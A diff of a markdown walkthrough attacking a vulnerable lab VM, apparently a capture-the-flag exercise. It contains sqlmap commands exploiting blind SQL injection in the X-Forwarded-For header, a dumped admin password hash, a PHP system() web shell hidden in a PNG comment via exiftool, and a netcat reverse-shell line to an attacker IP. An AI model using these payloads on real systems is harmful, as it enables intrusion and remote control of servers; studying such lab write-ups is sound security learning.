@@ -1,4 +1,8 @@
-# Blind SQLi to Shell Walkthrough
+
+
+# Walkthrough
+
+The first thing to do is to deploy the iso, I used VMWare, and get the ip (using the command __ifconfig__).
 
 ## Recon
 
@@ -6,9 +10,9 @@
 
 ```
 nmap -sC -sV 192.168.77.128
-
-Output:
-
+```
+  **Output:**
+```
 80/tcp open  http    nginx 0.7.67
 |_http-server-header: nginx/0.7.67
 |_http-title: My Photoblog - latest picture
@@ -30,71 +34,32 @@ Content-Length: 1347
 
 ```
 
-### Attack method
+## Attack method
 
-#### Blind SQLi
+### Blind SQLi
 
+I use this website to learn more about the differents usages of **sqlmap**:
 https://book.hacktricks.xyz/pentesting-web/sql-injection/sqlmap
 
-1. SQLMAP to find the number of databases and it's names
+**SQLMap arguments I tried:**
+```
+$ sqlmap -u "http://192.168.77.128/cat.php?id=*" -p id
+
+$ sqlmap -u "http://192.168.77.128/" --headers "referer:*"
+
+$ sqlmap -u "http://192.168.77.128/" --headers "x-forwarded-for:*"
+```
+
+**SQLMAP to find the number of databases and it's names**
 
 ```
-sqlmap -u http://192.168.77.128/ --headers "x-forwarded-for: *" --dbs --dump-all
-```
+$ sqlmap -u http://192.168.77.128/ --headers "x-forwarded-for: *" --dbs --dump-all
 
-
-
-```
-for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] y
-[15:34:11] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
-[15:34:11] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
-[15:34:11] [INFO] checking if the injection point on (custom) HEADER parameter 'x-forwarded-for #1*' is a false positive
-(custom) HEADER parameter 'x-forwarded-for #1*' is vulnerable. Do you want to keep testing the others (if any)? [y/N] n
-sqlmap identified the following injection point(s) with a total of 74 HTTP(s) requests:
----
-Parameter: x-forwarded-for #1* ((custom) HEADER)
-    Type: time-based blind
-    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
-    Payload: ' AND (SELECT 6899 FROM (SELECT(SLEEP(5)))TztC) AND 'qEtn'='qEtn
----
-[15:34:48] [INFO] the back-end DBMS is MySQL
-[15:34:48] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions
-web application technology: PHP 5.3.3, Nginx 0.7.67
-back-end DBMS: MySQL >= 5.0.12
-[15:34:48] [INFO] fetching database names
-[15:34:48] [INFO] fetching number of databases
-[15:34:48] [INFO] retrieved:
-do you want sqlmap to try to optimize value(s) for DBMS delay responses (option '--time-sec')? [Y/n] y
-2
-[15:35:14] [INFO] retrieved:
-[15:35:24] [INFO] adjusting time delay to 1 second due to good response times
-[15:35:29] [ERROR] invalid character detected. retrying..
-[15:35:29] [WARNING] increasing time delay to 2 seconds
-information_schema
-[15:39:18] [INFO] retrieved: photoblog
-available databases [2]:
 [*] information_schema
 [*] photoblog
 
-[15:41:38] [INFO] sqlmap will dump entries of all tables from all databases now
-[15:41:38] [INFO] fetching tables for databases: 'information_schema, photoblog'
-[15:41:38] [INFO] fetching number of tables for database 'information_schema'
-[15:41:38] [INFO] retrieved: 28
-[15:41:58] [INFO] retrieved: CHARACTER_SETS
-[15:44:35] [INFO] retrieved: COL^Z
-[7]+  Stopped                 sqlmap -u http://192.168.77.128/ --headers "x-forwarded-for: *" --dbs --dump-all
-filipe@FILIPAZE:~$ sqlmap -u http://192.168.77.128/ --headers "x-forwarded-for: *" --dbs --dump-all -h
-```
+$ sqlmap -u http://192.168.77.128/ --headers "x-forwarded-for: *" --tables -D photoblog
 
-Databases names:
-
-1. information_schema: 28 tables
-2. photoblog
-
-
-```
- sqlmap -u http://192.168.77.128/ --headers "x-forwarded-for: *" --tables -D photoblog
-```
 
 Database: photoblog
 
@@ -103,11 +68,9 @@ Database: photoblog
 
 Table: users
 
-```
-sqlmap -u http://192.168.77.128/ --headers "x-forwarded-for: *" -D photoblog -T users --dump
-```
 
-```
+$ sqlmap -u http://192.168.77.128/ --headers "x-forwarded-for: *" -D photoblog -T users --dump
+
 Database: photoblog
 Table: users
 [1 entry]
@@ -117,6 +80,68 @@ Table: users
 | 1  | admin | 8efe310f9ab3efeae8d410a8e0166eb2 (P4ssw0rd) |
 +----+-------+---------------------------------------------+
 ```
+**Now that we have the username and the password, we can log in as admin.**
+**After some recon we are able to note only one point to explore, and gain a reverse shell: upload images feature.**
 
-<?php $cmd=$_GET ['cmd']; system ($cmd); ?>
+
+### Upload png file with php backdoor
+
+**Things I try without success:**
+
+1. Bypass uploads rules by intercepting the request and change the content-type to __image/jpeg__ 
+(https://vulp3cula.gitbook.io/hackers-grimoire/exploitation/web-application/file-upload-bypass)
+
+2. Rename the image from file.php to file.php.png
+
+
+## Final method
+
+**First we create a php file with a backdoor inside it:**
+
+```
+<?php
+
+if(isset($_REQUEST['cmd'])){
+    echo "<pre>";
+    $cmd = ($_REQUEST['cmd']);
+    system($cmd);
+    echo "</pre>";
+    die;
+}
+?>
+``` 
+
+Explanation of the code:
+
+1. First the code checks if there's a cmd parameter in the url;
+2. If so, it creates a pre tag on the page to generate retrieve the information withou breaking it, keeping the breaks and the spaces.
+3. Assigns the content of the parameter **cmd** to the variable **cmd**
+4. System() is for executing a system command on the server and immediately displaying the output.
+5. Kill the script
+
+
+**Using exiftool we are going to add a comment with our payload o the image**
+
+```
+exiftool exiftool "-comment<=file.php" backdoor.png
+```
+
+We are now ready to upload our backdoor and generate a reverse shell.
+
+
+## Now you can upload the file. After the upload you can trigger the backdoor using:
+
+```
+(...).png/cmd.php?cmd=ls
+```
+
+__We need to add cmd.php, otherwise the photo is displayed instead of the code we want__
+
+To create a reverse shell we use the following code instead of __ls__:
+https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#netcat-traditional
+
+```
+nc -e /bin/sh <attacker_ip> <nc_listener_port>
+```
+
 
